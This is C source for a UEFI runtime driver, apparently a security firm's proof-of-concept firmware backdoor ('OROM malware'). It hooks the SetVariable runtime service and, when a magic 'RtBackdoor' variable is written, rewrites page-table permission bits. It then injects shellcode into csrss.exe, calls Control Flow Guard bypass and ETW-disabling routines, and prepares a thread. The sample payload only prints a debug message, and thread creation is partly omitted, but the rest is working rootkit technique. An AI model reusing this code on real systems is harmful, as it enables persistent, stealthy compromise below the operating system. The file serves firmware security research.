/*
 * (c) FFRI Security, Inc., 2024 / Author: FFRI Security, Inc.
 */

#include <Uefi.h>
#include <Library/UefiDriverEntryPoint.h>
#include <Library/BaseLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include "UartPrint.h"
#include "common.h"
#include "pe.h"
#include "windows.h"
#include "nt.h"
#include "paging.h"
#include "identity.h"
#include "bypass.h"

#define MAGIC_VAR_NAME L"RtBackdoor"

UINT64 gUserBufAddr;
EFI_SET_VARIABLE gOrigSetVariable;

EFI_GUID gEfiEventVirtualAddressChangeGuid = \
  { 0x13FA7698, 0xC831, 0x49C7, { 0x87, 0xEA, 0x8F, 0x43, 0xFC, 0xC2, 0x51, 0x96 }};
EFI_EVENT gEfiEventVirtualAddressChange = NULL;


typedef
VOID
(*SHELLCODE_EXEC)(
    VOID
    );
SHELLCODE_EXEC ShellcodeExec;




VOID
ConvertToUsermodeBuf(
    )
{
  UINTN MaxPhyAddr = 0;
  UINTN rax, rbx, rcx, rdx;
  rax = 0x80000008;
  __asm__ __volatile__("cpuid" : "=a"(rax), "=b"(rbx), "=c"(rcx), "=d"(rdx) : "a"(rax));
  MaxPhyAddr = rax & 0xFF;
  UINTN mask = (((UINTN)1 << MaxPhyAddr) - 1) & ~((UINTN)0xFFF);


  UINTN cr3 = 0;
  __asm__ __volatile__("mov %%cr3, %%rax" : "=a"(cr3));
  UINTN Pml4BasePaddr = cr3 & mask;
  PVOID Pml4BaseVaddr = MmGetVirtualForPhysical(Pml4BasePaddr);

  UINTN OrigPml40 = *(UINTN*)Pml4BaseVaddr;

  // Switch to Identity Paging
  CopyMem(Pml4BaseVaddr, (PVOID)gIdentityPml40, 8);
  
  // Set user bit
  VIRTUAL_ADDR_4KB vaddr;
  vaddr.value = gUserBufAddr;

  IA32_PML4E *pml4e;
  IA32_PDPE  *pdpe;
  IA32_PDE   *pde;
  IA32_PTE   *pte;

  __asm__ __volatile__("invlpg %0" :: "m"(Pml4BasePaddr));
  pml4e = (IA32_PML4E*)(Pml4BasePaddr + 8*vaddr.PML4index);
  pml4e->UserSupervisor = 1;

  UINTN pdp_base = pml4e->value & mask;
  __asm__ __volatile__("invlpg %0" :: "m"(pdp_base));
  pdpe = (IA32_PDPE*)(pdp_base + 8*vaddr.PDPindex);
  pdpe->UserSupervisor = 1;

  UINTN pd_base = pdpe->value & mask;
  __asm__ __volatile__("invlpg %0" :: "m"(pd_base));
  pde = (IA32_PDE*)(pd_base + 8*vaddr.PDindex);
  pde->UserSupervisor = 1;

  UINTN pt_base = pde->value & mask;
  __asm__ __volatile__("invlpg %0" :: "m"(pt_base));
  pte = (IA32_PTE*)(pt_base + 8*vaddr.PTindex);
  pte->UserSupervisor = 1;

  // Switch back paging
  CopyMem(Pml4BaseVaddr, &OrigPml40, 8);
}



VOID
SetShellcode(
    PEPROCESS proc
    )
{
  UINT64 Kernel32DllBase = GetLoadedDllBase(proc, L"kernel32");
  OutputDebugStringA = (WINAPI_OUTPUTDEBUGSTRINGA)GetExport(Kernel32DllBase, "OutputDebugStringA");

  UCHAR shellcode[] = {
    // "Message from OROM malware!"
    0x4d, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x20,
    0x66, 0x72, 0x6f, 0x6d, 0x20, 0x4f, 0x52, 0x4f,
    0x4d, 0x20, 0x6d, 0x61, 0x6c, 0x77, 0x61, 0x72,
    0x65, 0x21, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

    0x48, 0x83, 0xEC, 0x20,                                     // 4  sub rsp,0x20
    0x50,                                                       // 1  push rax
    0x51,                                                       // 1  push rcx
    0x52,                                                       // 1  push rdx
    0xE8, 0x00, 0x00, 0x00, 0x00,                               // 5  call $+5
    0x59,                                                       // 1  pop rcx
    0x48, 0x83, 0xE9, 0x2C,                                     // 4  sub rcx,44
    0x48, 0xC7, 0xC2, 0x05, 0x00, 0x00, 0x00,                   // 7  mov rdx,0x5
    0x48, 0xB8, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, // 10 mov rax, 0x1122334455667788
    0xFF, 0xD0,                                                 // 2  call rax (OutputDebugStringA)
    0x5A,                                                       // 1  pop rdx
    0x59,                                                       // 1  pop rcx
    0x58,                                                       // 1  pop rax
    0x48, 0x83, 0xC4, 0x20,                                     // 4  add rsp,0x20
    0xC3                                                        // 1  ret
  };

  UINTN oOutputDebugStringA = 32+4+1+1+1+5+1+4+7+2;
  CopyMem((VOID*)(shellcode+oOutputDebugStringA), (VOID*)&OutputDebugStringA, 8);

  CopyMem((VOID*)gUserBufAddr, shellcode, sizeof(shellcode));
  ShellcodeExec = (SHELLCODE_EXEC)(gUserBufAddr + 32);
}



VOID
PrepareThread(
    PEPROCESS TargetProcess
    )
{
  // partially omitted
  DisableETW(FALSE);
  // RtlCreateUserThread
  DisableETW(TRUE);
}



BOOLEAN gDone = FALSE;
/**

  Flip user bit of buffer.
  (Using SetVariable for debug reason.
  Should be hooking GetVariable to trigger this automatically.)

**/
EFI_STATUS
EFIAPI
SetVariableHook(
    IN  CHAR16    *VariableName,
    IN  EFI_GUID  *VendorGuid,
    IN  UINT32    Attributes,
    IN  UINTN     DataSize,
    IN  VOID      *Data
    )
{
  if(VariableName!=NULL && StrnCmp(VariableName, MAGIC_VAR_NAME, (sizeof(MAGIC_VAR_NAME)/sizeof(CHAR16))-1) == 0) {
    if(!gDone) {
      ResolveNtosExport();

      PEPROCESS TargetProcess = GetProcessByName(L"csrss.exe");

      SetProcessContext(TargetProcess, FALSE);
      ConvertToUsermodeBuf();

      SetShellcode(TargetProcess);
      BypassCFG(TargetProcess);
      PrepareThread(TargetProcess);

      SetProcessContext(TargetProcess, TRUE);

      gDone = TRUE;
      return EFI_SUCCESS;
    }
  }

	return gOrigSetVariable(VariableName, VendorGuid, Attributes, DataSize, Data); 
}



/**

  SetVirtualAddressMap Event

**/
VOID
EFIAPI
SetVirtualAddressMapEvent(
    IN  EFI_EVENT  Event,
    IN  VOID       *Context
    )
{
  // From this point, these variables will hold virt addr
  // rather than phy addr
  gRT->ConvertPointer(0, (VOID**)&gOrigSetVariable);
  gRT->ConvertPointer(0, (VOID**)&gUserBufAddr);
  gRT->ConvertPointer(0, (VOID**)&gIdentityPml40);
}



/**

  Driver Entry

**/
EFI_STATUS
EFIAPI
DxeEntry(
    IN EFI_HANDLE        ImageHandle,
    IN EFI_SYSTEM_TABLE *SystemTable
    )
{
  // 
  // Prepare Identity Page Table
  //
  MakeIdentityPageTable();


  // 
  // Allocate Runtime Memory for shellcode
  //
  UINTN pageNum = 1;
  EFI_PHYSICAL_ADDRESS UserBuf;
  gBS->AllocatePages(
      AllocateAnyPages,
      EfiRuntimeServicesCode,
      pageNum,
      &UserBuf
      );
  gUserBufAddr = (UINT64)UserBuf;


  // 
  // Create SetVirtualAddressMap Event
  //
  gBS->CreateEventEx(
      EVT_NOTIFY_SIGNAL,
      TPL_NOTIFY,
      SetVirtualAddressMapEvent,
      NULL,
      &gEfiEventVirtualAddressChangeGuid,
      &gEfiEventVirtualAddressChange
      );


  //
  // Hook SetVariable for flipping user bit
  //
  EFI_TPL tpl = gBS->RaiseTPL(TPL_HIGH_LEVEL);
  gOrigSetVariable = gRT->SetVariable;
  gRT->SetVariable = SetVariableHook;
  gST->Hdr.CRC32 = 0;
  gBS->CalculateCrc32(&gST->Hdr, gST->Hdr.HeaderSize, &gST->Hdr.CRC32);
  gBS->RestoreTPL(tpl);

  return EFI_SUCCESS;
}
